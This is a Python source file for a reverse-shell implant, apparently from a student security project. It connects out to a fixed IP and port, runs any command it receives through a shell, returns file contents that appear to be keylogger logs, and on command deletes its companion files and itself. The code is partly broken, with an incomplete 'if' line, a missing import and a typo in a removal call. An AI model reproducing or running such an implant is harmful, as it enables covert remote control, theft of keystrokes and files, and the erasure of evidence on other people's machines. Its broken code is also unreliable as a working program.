import socket
import subprocess
import os
import threading
import datetime

# Call to
call_to_ip = '10.0.0.233'
# call_to_ip = "0.0.0.0"
call_to_port = 1234

# Socket creation
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect socket
s.connect((call_to_ip, call_to_port))

'''
    Creates a thread to handle the final clean up including removing itself from the system
'''
def schedule_exit(delay_time):
    
    def delayed_exit():
        curr_path = os.path.realpath(__file__) # Current file path

        try:
            os.remove(curr_path)
        except Exception as e:
            print(f"Failed to delete script: {str(e)}\n")

        sys.exit(0) # Exits program
    
    threading.Timer(delay_time, delayed_exit).start() # Start executor thread


while True:                                    # Loop until killed
    try:
        command = s.recv(1024).decode("utf-8").strip() # Catch commands being sent

        if connectionTime == 

        if command.lower() == "exit":          # Exit program
                                               #? Might be good to add additional work hear later
            s.close()

        # Time based reconnection for the reverse shell
        elif command.startswith("time "):
            start = command[5:] # Parse restart time


        
        elif command.startswith("cd "):        # Change directories
            try:
                os.chdir(command[3:])
                cwd = os.getcwd()
                s.send(f"Dir changed: {str(cwd)}\n".encode("utf-8"))
            except Exception as e:
                s.send(f"Dir change failed: {str(e)}\n".encode("utf-8"))
                continue

        elif command.startswith("; "):
            try:
                exec_command = command[2:]     # Parse command
                output = subprocess.check_output(exec_command, shell=True, stderr=subprocess.STDOUT, text=True)
                s.send(output.encode("utf-8")) # Returns the output of the run command

            except subprocess.CalledProcessError as e:
                s.send(f"Command failed: {e.output}\n".encode("utf-8"))
                continue
            except Exception as e:
                s.send(f"Unexpected error: {str(e)}\n".encode("utf-8"))
                continue
        
        # elif command.startswith("clean"):
            # #

        elif command.strip().lower() == "clean":
            '''
                Currently file locations are in known static locations
                For the project we are keeping them all in 1 directory
                Could be placed and cleaned anywhere
            '''
            try:
                files_to_clean = [
                    "deployPer.py",
                    "log.py",
                    "sliBuy.html",
                    "keyloggerLogs.txt"
                ]

                # Validate & remove
                for filePath in files_to_clean:
                    if os.path.exists(filePath):
                        try:
                            ox.remove(filePath)
                            s.send(f"File removed: {filePath}\n")
                        except Exception as e:
                            s.send(f"Failed to remove {filePath}: {str(e)}\n".encode("utf-8"))
                    else:
                        s.send(f"File not found: {filePath}\n".encode("utf-8"))
                
                schedule_exit(10) # Start executioner thread
                s.send(f"Executioner thread started".encode("utf-8"))

            except Exception as e:
                s.send(f"Clean failure: {e}\n".encode("utf-8"))



            

        


        elif command.strip().lower() == "rtv":
            try:
                # Get the user's home directory
                user_home = os.environ.get("HOME")  # Default to /tmp if HOME is not set
                desktopDir = os.path.join(user_home, "Desktop/testing")

                # Navigate to Desktop
                if os.path.exists(desktopDir):
                    os.chdir(desktopDir)
                else:
                    raise FileNotFoundError(f"Directory not found: {desktopDir}")


                tgtF = "sysLogs.txt"  # Target file to check
                if not os.path.exists(tgtF):  # Check if the file exists
                    s.send(f"File path for {tgtF} does not exist\n".encode("utf-8"))
                    continue


                with open(tgtF, "r") as file:  # Read file contents
                    content = file.read()
                s.send(content.encode("utf-8"))  # Send file content back

            except Exception as e:
                s.send(f"Failed to rtv logs: {str(e)}\n".encode("utf-8"))

        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                s.send(output.encode("utf-8"))

            except subprocess.CalledProcessError as e:
                s.send(f"Command execution failed: {str(e)}\n".encode("utf-8"))
                continue
            except Exception as e:
                s.send(f"Unexpected error: {str(e)}\n".encode("utf-8"))
                continue

    except Exception as e:
        s.send(f"An error occured: {str(e)}\n".encode("utf-8"))

# Close connection
s.close()
input("Press enter to continue..")        

